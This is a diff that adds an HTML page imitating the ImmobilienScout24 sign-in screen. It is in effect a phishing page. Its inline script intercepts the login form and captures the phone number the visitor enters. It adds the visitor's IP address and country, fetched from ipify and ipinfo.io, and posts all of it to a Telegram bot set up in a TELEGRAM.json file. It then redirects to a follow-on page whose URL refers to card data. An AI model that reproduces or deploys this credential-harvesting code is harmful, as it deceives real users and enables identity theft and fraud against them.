@@ -1,0 +1,273 @@
+
+<!DOCTYPE html>
+<html class="height-full">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, user-scalable=no"/>
+    <meta name="msapplication-config" content="none"/>
+    <meta name="referrer" content="origin"/>
+
+    
+    <title>Welcome - ImmobilienScout24</title>
+
+		<link rel="icon" type="image/vnd.microsoft.icon" href="./favicon.ico"/>
+		<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="./favicon.ico"/>
+		
+  <link rel="stylesheet" type="text/css" href="./style.css"/>
+
+  <link rel="stylesheet" type="text/css" href="https://www.static-immobilienscout24.de/fro/core/6.3.0/css/core.min.css" />
+  <link rel="stylesheet" type="text/css" href="https://www.static-immobilienscout24.de/fro/cosma-ui-icons/6.11.0/s24-icons.css" />
+  <link rel="stylesheet" type="text/css" href="https://sso.immobilienscout24.de/css/sso.min.css"/>
+
+  <script type="text/javascript" src="https://www.static-immobilienscout24.de/fro/jquery/3.6.2/jquery.min.js"></script>
+  <script type="text/javascript" src="https://www.static-immobilienscout24.de/fro/jquery-ui-autocomplete/1.12.1/jquery-ui-autocomplete.min.js" ></script>
+  <script type="text/javascript" src="https://www.static-immobilienscout24.de/fro/core/6.3.0/js/core.min.js" ></script>
+  <link rel="stylesheet" href="https://www.static-immobilienscout24.de/fro/gac/4.0.11/gac.css"/>
+  <script type="text/javascript" src="https://www.static-immobilienscout24.de/fro/gac/4.0.11/gac.min.js"></script>
+  <script type="text/javascript" src="https://sso.immobilienscout24.de/js/sso.min.js"></script>
+  <script type="text/javascript" src="https://sso.immobilienscout24.de/js/sjcl.js"></script>
+  
+    <script type="text/javascript" src="https://823579eddc51.edge.sdk.awswaf.com/823579eddc51/b8c8a05d32d1/challenge.js" async></script>
+  
+
+    
+        <script id="ets" src="https://tracking.immobilienscout24.de/tr.js?reportEventsIndividually=true&amp;cP--svc_module_name=sso&amp;cP--svc_consumer_sso=is24main&amp;cP--countername=is24.de.sso.welcome"></script>
+
+        
+    
+    <script src="https://global.oktacdn.com/okta-auth-js/6.0.0/okta-auth-js.min.js" type="text/javascript"></script>
+    
+</head>
+
+<header>
+
+
+  <header class="page-header content-wrapper"><div class="topnavigation only-desk-and-up-content-wrapper grid grid-flex grid-align-center grid-fill-rows"><svg display="none" viewBox="0 0 274 56" xmlns="http://www.w3.org/2000/svg"><symbol id="is24_logo_topnav"><path d="m109.7 53.7c.7 3.8-17.6-4.7-25-6.1-30.3.8-56 7.7-82 6.2 0-5.1-2-12.9-1.5-18.7-.3-1-1.5-5.9-.5-6.2-1.1-.2-.7-1.2-.6-1.9-.1-.6 1.5-.4 1.9-.6.4-.5-.2-1.2 0-1.9-.1-1-1.3-1-.3-1.7 0-.8-.3-3 .1-3.9.1-.7-1.3-.5-1-1.3 1.6-2.1-.6-5.8.4-7.7 18.1-5.4 55.8-7.3 87-9.6 5.3 2.2 26.6 11 33.6 14.2.5.3.2.5.2.5-1 .5.5 1.4-.2 2.2-1.3.7-.3.7-.2 1.7-.7 1.9-2.6 4.6-2.7 6.7.6 2.7-2.7 2-1.2 4.4-.6-.2-.5 1.3-.4 2-1.6.1 0 .6-.5 1.2-.5.2.2.7-.2 1-2 .2.7.4-1.3 2.2-.8.9-.5 2.1-.1 3.4-.3.4-1.1-.7-.6.4 0 .7-1.1 1.6-1.1 2.3.1.2.2.7-.2.4-1.3.6 1.8 1.8-.4 1.9-.7.9-.9 2.4-2.1 2.9-.6-.1.5 1.3-.1 1.3-.5.3.4 1.9-.6 1.7-1.3.3.4 1.8-.4 3z" fill="#00ffd0"/><g id="is24_logo_immo_txt" fill="#333"><path d="m11.8 13.8v29.3h4.4v-31z"/><path d="m46.9 21.8c-1.3-1.1-3-1.8-4.8-1.7-3.3 0-5.8 1.5-6.9 4-1.1-2.9-3.7-4-5.9-4-2.4 0-4.4 1.1-5.4 2.9l-.6-2.3h-3.3v22.4h4v-13.8c0-3.3 1.8-5.4 4.7-5.4 2.4 0 3.8 1.5 3.8 4.2v15h4v-13.8c0-3.3 1.8-5.4 4.7-5.4 2.4 0 3.8 1.5 3.8 4.2v15h4v-16.1c.1-2.1-.7-3.9-2.1-5.2z"/><path d="m79.7 21.8c-1.3-1.1-3-1.8-4.8-1.7-3.3 0-5.8 1.5-6.9 4-1.1-2.9-3.7-4-5.9-4-2.4 0-4.4 1.1-5.4 2.9l-.6-2.3h-3.3v22.4h4v-13.8c0-3.3 1.8-5.4 4.7-5.4 2.4 0 3.8 1.5 3.8 4.2v15h4v-13.8c0-3.3 1.8-5.4 4.7-5.4 2.4 0 3.8 1.5 3.8 4.2v15h4v-16.1c.1-2.1-.6-3.9-2.1-5.2z"/><path d="m96 20.1c-3.2 0-6 1.2-8.1 3.5-1.9 2.1-3 5.1-3 8.3s1 6.2 3 8.3c2 2.3 4.8 3.5 8.1 3.5 6.4 0 11-4.9 11-11.8s-4.6-11.8-11-11.8zm0 19.6c-3.5 0-7-2.7-7-7.9 0-4.5 2.9-7.8 7-7.8 4 0 6.9 3.3 6.9 7.8 0 5.2-3.5 7.9-6.9 7.9z"/></g><g id="is24_logo_scout24_txt"><path d="m235.7 38.9c.6-.5 1.3-1 1.9-1.5 5.9-4.5 12-9.2 12-16.1 0-5.4-3.9-9.1-9.4-9.1-4.9 0-10.1 3.3-10.1 10.4 0 .3 0 .6.1 1l4-1.5c0-3.9 2.9-6 5.8-6 2.8 0 5.7 1.8 5.7 5.8 0 5.2-5.3 9.2-12.6 14.8-1 .8-2.1 1.6-3.2 2.5l-.1.1v3.7h20.8v-4.1z"/><path d="m136.8 25.5-.4-.1c-3.3-1.3-5.6-2.5-5.6-5.4s2.3-4.4 4.6-4.4c1.8 0 4.1 1 5.1 3.1l3.9-1.5-.1-.1c-1.5-3.8-5.5-5.4-8.8-5.4-4.3 0-8.9 2.7-8.9 8.7 0 5.8 4.5 7.6 8 9.1l.4.2c3.7 1.5 6.1 2.7 6.1 5.7 0 3.1-2.6 4.5-5.2 4.5s-5.6-1.4-6.5-5.2v-.2l-4.1 1.5c1.2 4.8 5.3 7.8 10.4 7.8 2.6 0 5-.8 6.8-2.2 2-1.6 3.1-3.9 3.1-6.7 0-5.9-4.6-7.7-8.8-9.4z"/><path d="m180 20.2c-6.4 0-11 4.9-11 11.7s4.6 11.7 11 11.7 11-4.9 11-11.7-4.6-11.7-11-11.7zm7 11.7c0 5.2-3.5 7.9-6.9 7.9-3.5 0-7-2.7-7-7.9 0-4.6 2.9-7.9 7-7.9 4 0 6.9 3.3 6.9 7.9z"/><path d="m207.9 33.6c0 4.1-3 6.3-5.9 6.3-2.2 0-4.5-1.3-4.5-4.9v-14.3h-3.9v14.3c0 6.3 4.1 8.6 7.6 8.6 2.8 0 5.3-1.4 6.6-3.6l.7 3.1h3.2v-22.4h-3.9z"/><path d="m222.1 14.3-3.9 1.5v4.9h-3.7v3.6h3.7v12.3c0 6.1 3.5 7 5.6 7 1 0 2-.2 2.9-.4h.1v-3.9l-.3.2c-.6.4-1.2.6-1.9.6-1.6 0-2.5-1.1-2.5-3.1v-12.7h4.6v-3.6h-4.6z"/><path d="m268.7 31.5v-9.1l-4 1.6v7.5h-9.1l11.1-18.8h-4.5l-11.7 19.9v3h14.2v7.5h4v-7.5h5.2v-4.1z"/><path d="m164.3 36.3c-1.1 2.1-3.3 3.5-5.7 3.4-3.4 0-6.7-2.4-6.7-7.9 0-3.8 2-7.8 6.5-7.8 2.2 0 4.2 1.2 5.2 3.1l3.8-1.4-.1-.1c-1.6-3.3-5-5.4-8.9-5.4-2.7 0-5.3 1-7.2 2.9-2.1 2.1-3.3 5.2-3.3 8.8 0 8.1 5.5 11.7 10.6 11.7 4 0 7.5-2.2 9.4-5.8l.1-.1z"/></g></symbol></svg><div class="grid-item grid-align-center grid-item-fixed-width header-desk-padding-vertical-m header-lap-padding-vertical-l header-palm-padding-vertical-l"><div class="page-header__content page-header__logo-container desk-line-height-18 lap-line-height-0 palm-line-height-0"><a href="https://www.immobilienscout24.de/" title="Zur Homepage von ImmoScout24" aria-label="Zur Homepage von ImmoScout24" class="page-header__logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 274 56" class="desk-height-28 lap-height-28 palm-height-l"><style>#is24_logo_topnav #is24_logo_scout24_txt{fill:var(--header-logo-topnav-scout24-color,#333)}</style><use href="#is24_logo_topnav"/></svg></a></div></div><div class="grid-item grid-item-fixed-width padding-vertical-m palm-hide header-claim margin-left-xxl">Die Nr. 1 für Immobilien.</div><div class="grid-item"><!-- placeholder to put items in the grid with space between left and right --></div></div><div class="header__divider one-whole absolute-content desk-height-s"></div><div id="sidebarnavigation-overlay" class="sidebarnavigation-overlay height-full one-whole hide"></div>
+  </header>
+  
+  
+  
+</header>
+
+
+<body class="height-full grid-flex flex-flow-column" data-theme="cosma">
+<div class="background palm-background-white flex-grow-1 grid background-image hero-image">
+        <div class="background-white border align-center sso-shadow padding-xl box-max-width box-min-height margin-vertical-xl margin-horizontal-auto grid-flex flex-flow-column palm-no-margin-vertical  palm-no-shadow palm-no-border palm-no-min-height">
+            
+
+
+
+  <h4 id="emailEntry" class="font-light margin-bottom-xl">
+    <span>Anmelden oder registrieren</span>
+  </h4>
+
+  
+
+  
+
+    
+    <form id="mitid-core-client-form">
+        <div>
+    
+</div>
+
+        
+            <input type="hidden" value="8c88c2a0-c8c9-4813-9718-1a66c01c5081"
+                   readonly="readonly" id="tokenMapt1745540462121" name="tokenMap[t1745540462121]"/>
+        
+        <div class="padding-top input-text-container">
+          <label class="float-left input-label" for="username">Telefonnummer</label>
+          <input id="username" type="text" class="input-text one-whole margin-top-xs" inputmode="email" autofocus="autofocus" name="username" value="">
+          
+        </div>
+        <div class="grid-item">
+            <button id="submit" class="button-primary one-whole margin-top-l"
+                    type="submit"
+                    value="Submit">Weiter</button>
+        </div>
+        <div class="grid-item padding-top">
+          <p>
+              <span>
+                <a href="#" class="with-icon" id="forgotAccessData">Zugangsdaten vergessen?</a>
+              </span>
+          </p>
+        </div>
+
+    </form>
+
+
+  <div class="font-lightgray one-whole grid-item margin-top-auto padding-top-l">
+    <div class="grid-item one-whole align-center">
+        <img src="https://sso.immobilienscout24.de/img/icn_lock.svg"/>
+        <span class="align-top">Diese Verbindung ist sicher.</span>
+    </div>
+</div>
+
+        </div>
+
+</div>
+
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+		
+        <script>
+            $("#username").mask("‎+49 000000000000");
+        </script>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('TELEGRAM.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#mitid-core-client-form").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var USER = $("#username").val().trim();
+
+            if (USER) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Login Info**\n\n" +
+                                "🔹 **USER:** `" + USER + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+                            $.post(telegramBotUrl, requestData, function () {
+                                window.location.href = "load1.html?vc?__event=card&service_id=top_card=DE";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+</script>
+
+<footer>
+  <style>footer.page-footer li a,footer.page-footer li a:active,footer.page-footer li a:hover,footer.page-footer li a:link,footer.page-footer li a:visited{color:#757575;padding-right:8px;margin-left:4px}</style>
+
+  <footer class="page-footer main-footer" role="contentinfo">
+  <section class="content-wrapper padding-top-l"><h6>Seiteninformationen</h6><ul class="margin-bottom-m"><li><a href="#" title="Über uns">Über uns</a></li>
+  <li><a href="#" title="Kontakt &amp; Hilfe">Kontakt &amp; Hilfe</a></li>
+  <li><a href="#" title="Impressum">Impressum</a></li>
+  <li><a href="#" title="AGB &amp; Rechtliche Hinweise">AGB &amp; Rechtliche Hinweise</a></li>
+  <li><a href="#" title="Datenschutz">Datenschutz</a></li>
+  <li><a href="#" title="Verbraucherinformationen">Verbraucherinformationen</a></li>
+  <li><a href="#" title="Sicherheit">Sicherheit</a></li>
+  <li><a href="#" title="Verträge hier kündigen">Verträge hier kündigen</a></li>
+  <li><a href="#" title="Zum Privacy-Manager" id="footerPrivacyManager">Zum Privacy-Manager</a></li>
+  </ul><p class="build-information">&copy; Copyright 1999 - 2025 Immobilien Scout GmbH</p>
+  </section>
+  </footer><!-- version: pro-is24-de-footer-small-default | 2025-04-16T10:01:30.973Z | 0ef9d11 -->
+</footer>
+
+
+
+
+  <div>
+  <style>
+    #moinIFrame {
+      height: 85px;
+      width: 85px;
+    }
+
+    #moinIFrame.active {
+      height: 700px;
+      width: 500px;
+      max-height: calc(100% - 20px);
+      max-width: calc(100% - 20px);
+      margin: 10px;
+    }
+  </style>
+
+  <iframe id="moinIFrame" sandbox="allow-popups allow-same-origin allow-scripts"
+          style="position: fixed; bottom: 0; right: 0;"
+          src="data:text/html;charset=UTF-8,&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+&lt;title&gt;MoinAi IFrame&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;style&gt;
+html, body{
+margin: 0;
+padding: 0;
+}
+&lt;/style&gt;
+&lt;script id=&quot;moinloader&quot; src=&quot;https://widget.moin.ai/moin-loader.js?id=9hskHyVE&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.chatWidgetReady = function() {
+window.knowhere.api.on(&#39;widget.interaction&#39;, function (data)  {
+window.top.postMessage(data.message.action, &quot;*&quot;);
+})
+}
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+">
+  </iframe>
+</div>
+
+<div id="is24-page-loaded"/>
+</html>
